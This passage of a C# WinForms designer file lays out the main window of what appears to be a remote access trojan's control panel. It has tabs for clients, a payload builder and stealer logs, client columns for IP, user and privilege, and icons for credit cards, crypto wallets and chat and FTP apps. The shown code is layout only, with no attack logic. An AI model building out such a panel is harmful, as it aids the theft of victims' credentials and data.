            this.imageTabs.Images.SetKeyName(0, "fixeduser.png");
            this.imageTabs.Images.SetKeyName(1, "bricks.png");
            this.imageTabs.Images.SetKeyName(2, "server.png");
            this.imageTabs.Images.SetKeyName(3, "exclamation.png");
            this.imageTabs.Images.SetKeyName(4, "sitemap.png");
            this.imageTabs.Images.SetKeyName(5, "application_osx_left.png");
            this.imageTabs.Images.SetKeyName(6, "connect.png");
            this.imageTabs.Images.SetKeyName(7, "user_thief_baldie.png");
            this.imageTabs.Images.SetKeyName(8, "Discord_16.png");
            this.imageTabs.Images.SetKeyName(9, "creditcards.png");
            this.imageTabs.Images.SetKeyName(10, "briefcase.png");
            this.imageTabs.Images.SetKeyName(11, "chart_organisation.png");
            this.imageTabs.Images.SetKeyName(12, "bookmark.png");
            this.imageTabs.Images.SetKeyName(13, "database.png");
            this.imageTabs.Images.SetKeyName(14, "dashboard.png");
            this.imageTabs.Images.SetKeyName(15, "filazilla.png");
            this.imageTabs.Images.SetKeyName(16, "foxmail.png");
            this.imageTabs.Images.SetKeyName(17, "ngrok.png");
            this.imageTabs.Images.SetKeyName(18, "obs.png");
            this.imageTabs.Images.SetKeyName(19, "steam.png");
            this.imageTabs.Images.SetKeyName(20, "telegram.png");
            this.imageTabs.Images.SetKeyName(21, "winscp.png");
            this.imageTabs.Images.SetKeyName(22, "crypto.png");
            this.imageTabs.Images.SetKeyName(23, "book_open.png");
            this.imageTabs.Images.SetKeyName(24, "text_list_bullets.png");
            this.imageTabs.Images.SetKeyName(25, "book_addresses.png");
            this.imageTabs.Images.SetKeyName(26, "ui_text_field_password.png");
            this.imageTabs.Images.SetKeyName(27, "key.png");
            this.imageTabs.Images.SetKeyName(28, "application2.png");
            this.imageTabs.Images.SetKeyName(29, "counter.png");
            this.imageTabs.Images.SetKeyName(30, "ddr_memory.png");
            this.imageTabs.Images.SetKeyName(31, "application_windows_grow.png");
            this.imageTabs.Images.SetKeyName(32, "bell.png");
            this.imageTabs.Images.SetKeyName(33, "bin_closed.png");
            this.imageTabs.Images.SetKeyName(34, "blog.png");
            this.imageTabs.Images.SetKeyName(35, "bluetooth.png");
            this.imageTabs.Images.SetKeyName(36, "bomb.png");
            this.imageTabs.Images.SetKeyName(37, "bookmark.png");
            this.imageTabs.Images.SetKeyName(38, "brick.png");
            this.imageTabs.Images.SetKeyName(39, "bricks.png");
            this.imageTabs.Images.SetKeyName(40, "bullet_add_1.png");
            this.imageTabs.Images.SetKeyName(41, "bullet_add_2.png");
            this.imageTabs.Images.SetKeyName(42, "bullet_key.png");
            this.imageTabs.Images.SetKeyName(43, "camera.png");
            this.imageTabs.Images.SetKeyName(44, "cancel.png");
            this.imageTabs.Images.SetKeyName(45, "cd.png");
            this.imageTabs.Images.SetKeyName(46, "chart_organisation.png");
            this.imageTabs.Images.SetKeyName(47, "clipboard_paste_image.png");
            this.imageTabs.Images.SetKeyName(48, "clipboard_sign.png");
            this.imageTabs.Images.SetKeyName(49, "clipboard_text.png");
            this.imageTabs.Images.SetKeyName(50, "comment.png");
            this.imageTabs.Images.SetKeyName(51, "control_pause.png");
            this.imageTabs.Images.SetKeyName(52, "control_play.png");
            this.imageTabs.Images.SetKeyName(53, "control_stop.png");
            this.imageTabs.Images.SetKeyName(54, "counter.png");
            this.imageTabs.Images.SetKeyName(55, "counter_count.png");
            this.imageTabs.Images.SetKeyName(56, "counter_count_up.png");
            this.imageTabs.Images.SetKeyName(57, "counter_reset.png");
            this.imageTabs.Images.SetKeyName(58, "cross.png");
            this.imageTabs.Images.SetKeyName(59, "cross_octagon.png");
            this.imageTabs.Images.SetKeyName(60, "cross_octagon_fram.png");
            this.imageTabs.Images.SetKeyName(61, "cross_shield.png");
            this.imageTabs.Images.SetKeyName(62, "cross_shield_2.png");
            this.imageTabs.Images.SetKeyName(63, "cursor.png");
            this.imageTabs.Images.SetKeyName(64, "cut.png");
            this.imageTabs.Images.SetKeyName(65, "dashboard.png");
            this.imageTabs.Images.SetKeyName(66, "database.png");
            this.imageTabs.Images.SetKeyName(67, "databases.png");
            this.imageTabs.Images.SetKeyName(68, "ddr_memory.png");
            this.imageTabs.Images.SetKeyName(69, "delete.png");
            this.imageTabs.Images.SetKeyName(70, "disconnect.png");
            this.imageTabs.Images.SetKeyName(71, "doc_convert.png");
            this.imageTabs.Images.SetKeyName(72, "drive_burn.png");
            this.imageTabs.Images.SetKeyName(73, "find.png");
            this.imageTabs.Images.SetKeyName(74, "flag_blue.png");
            this.imageTabs.Images.SetKeyName(75, "funnel.png");
            this.imageTabs.Images.SetKeyName(76, "grid.png");
            this.imageTabs.Images.SetKeyName(77, "group.png");
            this.imageTabs.Images.SetKeyName(78, "keyboard.png");
            this.imageTabs.Images.SetKeyName(79, "layers.png");
            this.imageTabs.Images.SetKeyName(80, "magnifier.png");
            this.imageTabs.Images.SetKeyName(81, "microphone.png");
            this.imageTabs.Images.SetKeyName(82, "note.png");
            this.imageTabs.Images.SetKeyName(83, "page_paste.png");
            this.imageTabs.Images.SetKeyName(84, "page_red.png");
            this.imageTabs.Images.SetKeyName(85, "server.png");
            this.imageTabs.Images.SetKeyName(86, "shape_align_left.png");
            this.imageTabs.Images.SetKeyName(87, "shape_group.png");
            this.imageTabs.Images.SetKeyName(88, "shape_group2.png");
            this.imageTabs.Images.SetKeyName(89, "status_offline.png");
            this.imageTabs.Images.SetKeyName(90, "status_online_blue.png");
            this.imageTabs.Images.SetKeyName(91, "switch.png");
            this.imageTabs.Images.SetKeyName(92, "system_monitor.png");
            this.imageTabs.Images.SetKeyName(93, "textfield.png");
            this.imageTabs.Images.SetKeyName(94, "textfield_rename.png");
            this.imageTabs.Images.SetKeyName(95, "tick.png");
            this.imageTabs.Images.SetKeyName(96, "toolbox.png");
            this.imageTabs.Images.SetKeyName(97, "ui_text_field_password.png");
            this.imageTabs.Images.SetKeyName(98, "view_thumbnail.png");
            this.imageTabs.Images.SetKeyName(99, "wrench.png");
            this.imageTabs.Images.SetKeyName(100, "bricks.png");
            this.imageTabs.Images.SetKeyName(101, "briefcase.png");
            this.imageTabs.Images.SetKeyName(102, "cake.png");
            this.imageTabs.Images.SetKeyName(103, "cog.png");
            this.imageTabs.Images.SetKeyName(104, "control_pause.png");
            this.imageTabs.Images.SetKeyName(105, "control_play.png");
            this.imageTabs.Images.SetKeyName(106, "control_stop.png");
            this.imageTabs.Images.SetKeyName(107, "desktop_empty.png");
            this.imageTabs.Images.SetKeyName(108, "drink.png");
            this.imageTabs.Images.SetKeyName(109, "drink_empty.png");
            this.imageTabs.Images.SetKeyName(110, "drive_cd_empty.png");
            this.imageTabs.Images.SetKeyName(111, "layers.png");
            this.imageTabs.Images.SetKeyName(112, "lock_unlock.png");
            this.imageTabs.Images.SetKeyName(113, "microphone.png");
            this.imageTabs.Images.SetKeyName(114, "money.png");
            this.imageTabs.Images.SetKeyName(115, "nuclear.png");
            this.imageTabs.Images.SetKeyName(116, "package.png");
            this.imageTabs.Images.SetKeyName(117, "shield.png");
            this.imageTabs.Images.SetKeyName(118, "star_1.png");
            this.imageTabs.Images.SetKeyName(119, "target.png");
            this.imageTabs.Images.SetKeyName(120, "wait.png");
            this.imageTabs.Images.SetKeyName(121, "wall.png");
            this.imageTabs.Images.SetKeyName(122, "wall_brick.png");
            this.imageTabs.Images.SetKeyName(123, "world.png");
            this.imageTabs.Images.SetKeyName(124, "zone.png");
            this.imageTabs.Images.SetKeyName(125, "zone_money.png");
            // 
            // statusStrip
            // 
            this.statusStrip.BackColor = System.Drawing.Color.Transparent;
            this.statusStrip.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.statusStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.listenToolStripStatusLabel,
            this.ClientsToolStripStatusLabel,
            this.SelectedClienttoolStripStatusLabel});
            this.statusStrip.Location = new System.Drawing.Point(0, 422);
            this.statusStrip.Name = "statusStrip";
            this.statusStrip.RenderMode = System.Windows.Forms.ToolStripRenderMode.Professional;
            this.statusStrip.Size = new System.Drawing.Size(881, 25);
            this.statusStrip.TabIndex = 3;
            this.statusStrip.Text = "statusStrip1";
            // 
            // listenToolStripStatusLabel
            // 
            this.listenToolStripStatusLabel.AutoSize = false;
            this.listenToolStripStatusLabel.BorderSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Right;
            this.listenToolStripStatusLabel.ForeColor = System.Drawing.Color.White;
            this.listenToolStripStatusLabel.Image = global::InvokedServer.Properties.Resources.asterisk_grey;
            this.listenToolStripStatusLabel.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.listenToolStripStatusLabel.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.listenToolStripStatusLabel.Margin = new System.Windows.Forms.Padding(3, 3, 0, 2);
            this.listenToolStripStatusLabel.Name = "listenToolStripStatusLabel";
            this.listenToolStripStatusLabel.Size = new System.Drawing.Size(160, 20);
            this.listenToolStripStatusLabel.Text = "Listening: False";
            // 
            // ClientsToolStripStatusLabel
            // 
            this.ClientsToolStripStatusLabel.AutoSize = false;
            this.ClientsToolStripStatusLabel.BorderSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Right;
            this.ClientsToolStripStatusLabel.ForeColor = System.Drawing.Color.White;
            this.ClientsToolStripStatusLabel.Image = global::InvokedServer.Properties.Resources.status_offline;
            this.ClientsToolStripStatusLabel.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.ClientsToolStripStatusLabel.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.ClientsToolStripStatusLabel.Margin = new System.Windows.Forms.Padding(2, 3, 0, 2);
            this.ClientsToolStripStatusLabel.Name = "ClientsToolStripStatusLabel";
            this.ClientsToolStripStatusLabel.Size = new System.Drawing.Size(160, 20);
            this.ClientsToolStripStatusLabel.Text = "Online:";
            // 
            // SelectedClienttoolStripStatusLabel
            // 
            this.SelectedClienttoolStripStatusLabel.ForeColor = System.Drawing.Color.White;
            this.SelectedClienttoolStripStatusLabel.Image = global::InvokedServer.Properties.Resources.selection;
            this.SelectedClienttoolStripStatusLabel.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.SelectedClienttoolStripStatusLabel.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
            this.SelectedClienttoolStripStatusLabel.Margin = new System.Windows.Forms.Padding(2, 3, 0, 2);
            this.SelectedClienttoolStripStatusLabel.Name = "SelectedClienttoolStripStatusLabel";
            this.SelectedClienttoolStripStatusLabel.Size = new System.Drawing.Size(73, 20);
            this.SelectedClienttoolStripStatusLabel.Text = "Selected: ";
            this.SelectedClienttoolStripStatusLabel.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // TabsControl
            // 
            this.TabsControl.Button.CloseButtonAction = ComponentFactory.Krypton.Navigator.CloseButtonAction.None;
            this.TabsControl.Button.CloseButtonDisplay = ComponentFactory.Krypton.Navigator.ButtonDisplay.Hide;
            this.TabsControl.Button.CloseButtonShortcut = System.Windows.Forms.Keys.None;
            this.TabsControl.Dock = System.Windows.Forms.DockStyle.Fill;
            this.TabsControl.Location = new System.Drawing.Point(0, 0);
            this.TabsControl.Name = "TabsControl";
            this.TabsControl.Pages.AddRange(new ComponentFactory.Krypton.Navigator.KryptonPage[] {
            this.ClientsPage,
            this.ServerPage,
            this.BuilderPage,
            this.kryptonPage1,
            this.GraphViewPage,
            this.StealerLogsPage,
            this.AutoTasksPage,
            this.AboutPage});
            this.TabsControl.Palette = this.MainKryptonPalette;
            this.TabsControl.PaletteMode = ComponentFactory.Krypton.Toolkit.PaletteMode.Custom;
            this.TabsControl.SelectedIndex = 0;
            this.TabsControl.Size = new System.Drawing.Size(881, 422);
            this.TabsControl.TabIndex = 0;
            this.TabsControl.TabStop = false;
            // 
            // ClientsPage
            // 
            this.ClientsPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.ClientsPage.Controls.Add(this.clientsVScrollBar);
            this.ClientsPage.Controls.Add(this.eventsLogVScrollBar);
            this.ClientsPage.Controls.Add(this.ClientsDataGridView);
            this.ClientsPage.Controls.Add(this.EventLogTopPanel);
            this.ClientsPage.Controls.Add(this.EventLogDataGridView);
            this.ClientsPage.Controls.Add(this.clientInfoPanel);
            this.ClientsPage.Flags = 65534;
            this.ClientsPage.ImageSmall = global::InvokedServer.Properties.Resources.status_online_blue;
            this.ClientsPage.LastVisibleSet = true;
            this.ClientsPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.ClientsPage.Name = "ClientsPage";
            this.ClientsPage.Size = new System.Drawing.Size(879, 396);
            this.ClientsPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.ClientsPage.Text = " Clients";
            this.ClientsPage.ToolTipTitle = "Page ToolTip";
            this.ClientsPage.UniqueName = "79174F756CCB4796A2977F91AC6343FD";
            // 
            // clientsVScrollBar
            // 
            this.clientsVScrollBar.AutoScroll = true;
            this.clientsVScrollBar.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
            this.clientsVScrollBar.BindingContainer = this.ClientsDataGridView;
            this.clientsVScrollBar.Dock = System.Windows.Forms.DockStyle.Right;
            this.clientsVScrollBar.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.clientsVScrollBar.HighlightOnWheel = true;
            this.clientsVScrollBar.InUpdate = false;
            this.clientsVScrollBar.LargeChange = 10;
            this.clientsVScrollBar.Location = new System.Drawing.Point(861, 0);
            this.clientsVScrollBar.Minimum = 1;
            this.clientsVScrollBar.Name = "clientsVScrollBar";
            this.clientsVScrollBar.ScrollbarSize = 18;
            this.clientsVScrollBar.Size = new System.Drawing.Size(18, 220);
            this.clientsVScrollBar.TabIndex = 10;
            this.clientsVScrollBar.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(39)))), ((int)(((byte)(52)))), ((int)(((byte)(66)))));
            this.clientsVScrollBar.ThumbStyle = Guna.UI2.WinForms.Enums.ThumbStyle.Inset;
            this.clientsVScrollBar.Value = 1;
            // 
            // ClientsDataGridView
            // 
            this.ClientsDataGridView.AllowUserToAddRows = false;
            this.ClientsDataGridView.AllowUserToDeleteRows = false;
            this.ClientsDataGridView.AllowUserToOrderColumns = true;
            this.ClientsDataGridView.AllowUserToResizeRows = false;
            dataGridViewCellStyle1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.ClientsDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle1;
            this.ClientsDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.ClientsDataGridView.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.ClientsDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle2.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle2.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.ClientsDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
            this.ClientsDataGridView.ColumnHeadersHeight = 20;
            this.ClientsDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.FlagCol,
            this.IPCol,
            this.TagCol,
            this.UserCol,
            this.VersionCol,
            this.StatusCol,
            this.UserStatusCol,
            this.CountryCol,
            this.OSCol,
            this.AccounttypeCol});
            this.ClientsDataGridView.ContextMenuStrip = this.ClientContextMenuStrip;
            dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle3.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(254)))));
            dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.ClientsDataGridView.DefaultCellStyle = dataGridViewCellStyle3;
            this.ClientsDataGridView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.ClientsDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.ClientsDataGridView.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.ClientsDataGridView.Location = new System.Drawing.Point(200, 0);
            this.ClientsDataGridView.Name = "ClientsDataGridView";
            this.ClientsDataGridView.ReadOnly = true;
            this.ClientsDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.ClientsDataGridView.RowHeadersVisible = false;
            this.ClientsDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.ClientsDataGridView.Size = new System.Drawing.Size(679, 220);
            this.ClientsDataGridView.TabIndex = 6;
            this.ClientsDataGridView.TabStop = false;
            this.ClientsDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.ClientsDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.ClientsDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.ClientsDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.ClientsDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.ClientsDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.ClientsDataGridView.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.ClientsDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.ClientsDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.ClientsDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ClientsDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.ClientsDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.ClientsDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.ClientsDataGridView.ThemeStyle.ReadOnly = true;
            this.ClientsDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.ClientsDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.ClientsDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ClientsDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.ClientsDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.ClientsDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.SteelBlue;
            this.ClientsDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            this.ClientsDataGridView.SelectionChanged += new System.EventHandler(this.ClientsDataGridView_SelectedIndexChanged);
            this.ClientsDataGridView.MouseDown += new System.Windows.Forms.MouseEventHandler(this.ClientsDataGridView_onMouseDown);
            // 
            // FlagCol
            // 
            this.FlagCol.FillWeight = 20F;
            this.FlagCol.HeaderText = "";
            this.FlagCol.Name = "FlagCol";
            this.FlagCol.ReadOnly = true;
            // 
            // IPCol
            // 
            this.IPCol.HeaderText = "IP Address";
            this.IPCol.Name = "IPCol";
            this.IPCol.ReadOnly = true;
            // 
            // TagCol
            // 
            this.TagCol.FillWeight = 60F;
            this.TagCol.HeaderText = "Tag";
            this.TagCol.Name = "TagCol";
            this.TagCol.ReadOnly = true;
            // 
            // UserCol
            // 
            this.UserCol.FillWeight = 120F;
            this.UserCol.HeaderText = "User@PC";
            this.UserCol.Name = "UserCol";
            this.UserCol.ReadOnly = true;
            // 
            // VersionCol
            // 
            this.VersionCol.FillWeight = 55F;
            this.VersionCol.HeaderText = "Version";
            this.VersionCol.Name = "VersionCol";
            this.VersionCol.ReadOnly = true;
            // 
            // StatusCol
            // 
            this.StatusCol.FillWeight = 60F;
            this.StatusCol.HeaderText = "Status";
            this.StatusCol.Name = "StatusCol";
            this.StatusCol.ReadOnly = true;
            // 
            // UserStatusCol
            // 
            this.UserStatusCol.FillWeight = 70F;
            this.UserStatusCol.HeaderText = "User Status";
            this.UserStatusCol.Name = "UserStatusCol";
            this.UserStatusCol.ReadOnly = true;
            // 
            // CountryCol
            // 
            this.CountryCol.HeaderText = "Country";
            this.CountryCol.Name = "CountryCol";
            this.CountryCol.ReadOnly = true;
            // 
            // OSCol
            // 
            this.OSCol.FillWeight = 120F;
            this.OSCol.HeaderText = "Operating System";
            this.OSCol.Name = "OSCol";
            this.OSCol.ReadOnly = true;
            // 
            // AccounttypeCol
            // 
            this.AccounttypeCol.FillWeight = 80F;
            this.AccounttypeCol.HeaderText = "Privilege";
            this.AccounttypeCol.Name = "AccounttypeCol";
            this.AccounttypeCol.ReadOnly = true;
            // 
            // eventsLogVScrollBar
            // 
            this.eventsLogVScrollBar.AutoScroll = true;
            this.eventsLogVScrollBar.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
            this.eventsLogVScrollBar.BindingContainer = this.EventLogDataGridView;
            this.eventsLogVScrollBar.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.eventsLogVScrollBar.HighlightOnWheel = true;
            this.eventsLogVScrollBar.InUpdate = false;
            this.eventsLogVScrollBar.LargeChange = 10;
            this.eventsLogVScrollBar.Location = new System.Drawing.Point(861, 240);
            this.eventsLogVScrollBar.Minimum = 1;
            this.eventsLogVScrollBar.Name = "eventsLogVScrollBar";
            this.eventsLogVScrollBar.ScrollbarSize = 18;
            this.eventsLogVScrollBar.Size = new System.Drawing.Size(18, 156);
            this.eventsLogVScrollBar.TabIndex = 11;
            this.eventsLogVScrollBar.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(39)))), ((int)(((byte)(52)))), ((int)(((byte)(66)))));
            this.eventsLogVScrollBar.ThumbStyle = Guna.UI2.WinForms.Enums.ThumbStyle.Inset;
            this.eventsLogVScrollBar.Value = 1;
            // 
            // EventLogDataGridView
            // 
            this.EventLogDataGridView.AllowUserToAddRows = false;
            this.EventLogDataGridView.AllowUserToDeleteRows = false;
            this.EventLogDataGridView.AllowUserToOrderColumns = true;
            this.EventLogDataGridView.AllowUserToResizeColumns = false;
            this.EventLogDataGridView.AllowUserToResizeRows = false;
            dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.White;
            this.EventLogDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle4;
            this.EventLogDataGridView.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.EventLogDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.EventLogDataGridView.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.EventLogDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle5.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle5.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.EventLogDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle5;
            this.EventLogDataGridView.ColumnHeadersHeight = 20;
            this.EventLogDataGridView.ColumnHeadersVisible = false;
            this.EventLogDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.LogData});
            this.EventLogDataGridView.ContextMenuStrip = this.EventLogsContextMenuStrip;
            dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle6.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle6.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.EventLogDataGridView.DefaultCellStyle = dataGridViewCellStyle6;
            this.EventLogDataGridView.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.EventLogDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.EventLogDataGridView.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.EventLogDataGridView.Location = new System.Drawing.Point(200, 240);
            this.EventLogDataGridView.Name = "EventLogDataGridView";
            this.EventLogDataGridView.ReadOnly = true;
            this.EventLogDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.EventLogDataGridView.RowHeadersVisible = false;
            this.EventLogDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.EventLogDataGridView.Size = new System.Drawing.Size(679, 156);
            this.EventLogDataGridView.TabIndex = 7;
            this.EventLogDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.EventLogDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.EventLogDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.EventLogDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.EventLogDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.EventLogDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.EventLogDataGridView.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.EventLogDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
